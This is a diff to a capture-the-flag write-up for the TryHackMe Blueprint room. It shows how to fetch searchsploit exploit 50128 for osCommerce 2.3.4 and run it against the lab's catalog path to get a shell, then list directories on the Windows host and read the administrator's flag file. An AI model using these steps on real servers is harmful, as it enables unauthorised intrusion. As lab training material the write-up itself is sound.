@@ -30,7 +30,7 @@ Privilege Escalation is a cyberattack where a user or application gains unauthor
 ---
 
 
-## What are TH(TryHackMe) rooms ?
+## What are THM(TryHackMe) rooms ?
 
 TryHackMe rooms runs on a vulnerable system.We Implement the techniques to hack the vulnerable systems.
 
@@ -148,10 +148,133 @@ searchsploit oscommerce 2.3.4
 
 We got some exploits but we will use this one `50128`
 
+![searchsploit](/assets/img/blueprint/searchploit.png)
 
+### How to Install any exploit from searchsploit
 
+```bash
+searchsploit -m path
+```
+real-line command
 
+```bash
+searchsploit -m php/webapps/50128.py
+```
 
+![searchsploit done](/assets/img/blueprint/done.png)
+
+# Organizing the exploit
+
+Next we will change the exploit name from `50128.py` to `THM-blueprint-oscommerce-2.3.4` so we could easily remember the exploit
+
+```bash
+mv 50128.py THM-blueprint-oscommerce-2.3.4
+```
+
+---
+
+## Lets Exploit
+
+To use this exploit we will use this command:
+
+```bash
+python3 exploit name + url
+```
+real-line command:
+
+```bash
+python3 THM-blueprint-oscommerce-2.3.4.py http://IP:8080/oscommerce-2.3.4/catalog/
+```
+
+After running this command we successfully got the shell
+
+![got shell](/assets/img/blueprint/shell.png)
+
+### Important Understanding
+
+You may have a question that why we used this particular url: http://IP:8080/oscommerce-2.3.4/catalog/ instead of anything so the Answer is:
+
+The exploit targets a specific vulnerable file inside osCommerce:
+
+`/catalog/install/install.php`
+
+This file exists inside the catalog directory of osCommerce.
+
+If you used only
+
+```http://IP:8080/oscommerce-2.3.4```
+
+then the exploit would try:
+
+```/oscommerce-2.3.4/install/install.php```
+
+But that file doesn't exist there, so the exploit fails.
+
+Simple rule
+
+You give the exploit the directory where the vulnerable application actually runs.
+
+Wrong path
+
+```/oscommerce-2.3.4/install/install.php ❌```
+
+Correct path
+
+```/oscommerce-2.3.4/catalog/install/install.php ✅```
+
+### Finding the flag
+
+We will use `dir` to list the contents of the directory and `type` to view a file.
+
+Lets try to discover the flag
+
+Run:
+
+```bash
+dir
+```
+
+we did run the command but got nothing helpful
+
+![got nothing](/assets/img/blueprint/dir.png)
+
+So we will use this command:
+
+```bash
+dir C:\Users
+```
+
+and yeah we got some helpful results
+
+![found administrator](/assets/img/blueprint/dir1.png)
+
+So we know that there is a Administrator directory inside the C drive
+
+**Lets find more**
+
+```bash
+dir C:\Users\Administrator
+```
+
+Yeah,we got all the directories
+
+![found all directories](/assets/img/blueprint/dir2.png)
+
+Lets check the `desktop` directory
+
+```bash
+dir C:\Users\Administrator\Desktop
+```
+
+So yeah we got a root.txt.txt file which is our 1st flag
+
+![found flag](/assets/img/blueprint/dir3.png)
+
+lets see the flag:
+
+```bash
+type C:\Users\Administrator\Desktop\root.txt.txt
+```
 
 
 
